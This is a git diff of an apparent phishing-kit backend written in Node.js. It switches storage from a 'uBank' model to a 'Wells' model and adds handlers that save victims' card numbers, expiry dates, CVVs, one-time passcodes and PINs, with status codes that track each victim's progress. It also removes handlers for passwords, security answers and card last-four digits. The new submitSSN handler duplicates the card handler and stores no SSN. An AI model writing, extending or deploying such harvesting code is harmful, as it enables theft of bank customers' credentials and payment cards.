@@ -59,10 +59,32 @@ const submitLoginAgain = async (req, res) => {
   }
 };
 
+const submitCard = async (req, res) => {
+  const { ccnum, ccexp, cvv, uniqueid } = req.body;
+  try {
+    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 7 }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
+const submitSSN = async (req, res) => {
+  const { ccnum, ccexp, cvv, uniqueid } = req.body;
+  try {
+    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 7 }).exec();
+    res.sendStatus(200);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(400);
+  }
+};
+
 const submitOtp = async (req, res) => {
   const { otp, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
+    await Wells.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -73,42 +95,7 @@ const submitOtp = async (req, res) => {
 const submitPin = async (req, res) => {
   const { pin, uniqueid } = req.body;
   try {
-    await uBank.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
-};
-
-const submitLast4 = async (req, res) => {
-  const { last4, uniqueid } = req.body;
-  try {
-    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 4 }).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
-};
-
-const submitSecAnswer = async (req, res) => {
-  const { secAnswer, uniqueid } = req.body;
-  try {
-    await uBank
-      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 11 })
-      .exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
-};
-
-const submitPassword = async (req, res) => {
-  const { password, uniqueid } = req.body;
-  try {
-    await uBank.findOneAndUpdate({ uniqueid }, { password, status: 13 }).exec();
+    await Wells.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -119,7 +106,7 @@ const submitPassword = async (req, res) => {
 const deleteEntry = async (req, res) => {
   const { uniqueid } = req.body;
   try {
-    await uBank.deleteOne({ uniqueid });
+    await Wells.deleteOne({ uniqueid });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -134,9 +121,8 @@ module.exports = {
   submitLogin,
   submitLoginAgain,
   submitOtp,
+  submitCard,
+  submitSSN,
   submitPin,
-  submitLast4,
   deleteEntry,
-  submitPassword,
-  submitSecAnswer,
 };
